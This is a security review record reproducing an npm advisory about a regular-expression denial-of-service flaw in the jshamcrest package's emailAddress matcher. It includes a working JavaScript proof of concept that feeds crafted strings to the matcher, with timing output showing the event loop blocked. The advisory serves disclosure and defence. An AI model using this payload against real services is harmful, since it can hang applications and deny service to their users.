---
Publication-State: Active
Access: Public
Reviewers:
- Name: Adam Baldwin
  Associated-With-Project: false
  Compensation-Source: external
Domain: Security
Methodology:
- Code-Review
Issues-Identified: Not-Examined
Package-URLs:
- pkg:npm/jshamcrest
Review-Date: '2016-01-05'
Scope: Implementation/Full
Schema-Version: '1.0'
SPDX-License-Identifier: CC-BY-4.0
---
### Summary
*Regular Expression Denial of Service*<br><br>Recommendation: Do not pass untrusted user input into jshamcrest. Consider user a validator like joi that does not rely on regular expressions.
### Details
jshamcrest is vulnerable to regular expression denial of service (ReDoS) when certain types of user input is passed in to the emailAddress validator.  "The Regular expression Denial of Service (ReDoS) is a Denial of Service attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression to enter these extreme situations and then hang for a very long time." [1]    ### Proof of concept  ``` var js = require('jshamcrest') var emailAddress = new js.JsHamcrest.Matchers.emailAddress();   var genstr = function (len, chr) {     var result = "";     for (i=0; i<=len; i++) {         result = result + chr;     }      return result; }   for (i=1;i<=10000000;i=i+1) {     console.log("COUNT: " + i);     var str = '66666666666666666666666666666@ffffffffffffffffffffffffffffffff.' + genstr(i, 'a') + '{'     console.log("LENGTH: " + str.length);     var start = process.hrtime();     emailAddress.matches(str)      var end = process.hrtime(start);     console.log(end); } ```  ### Results It takes about 116 characters to get a 1.6 second event loop block. ``` [ 1, 633084590 ] COUNT: 51 LENGTH: 116 ```  # Timeline - October 25, 2015 - Vulnerability Identified - October 25, 2015 - Maintainers notified (no response)
<br><br>• Affected Versions: <=99.999.99999
<br>• Patched Versions: <0.0.0
### Methodology
This review was taken directly from the Security Advisories section of npm's official website.
### External References
['https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS']
### Disclaimer
All security reviews are conducted on a "best-effort" basis against a software component at a point in time. We make no guarantee as to the quality or completeness of any review. If you believe any content is inaccurate, we encourage you to open an issue or submit a pull request with a correction or improvement.
### License
This text is released under at least the [Creative Commons Attribution 4.0 (CC-BY-4.0) license](https://creativecommons.org/licenses/by/4.0/legalcode.txt). Externally-referenced content may be licensed differently.
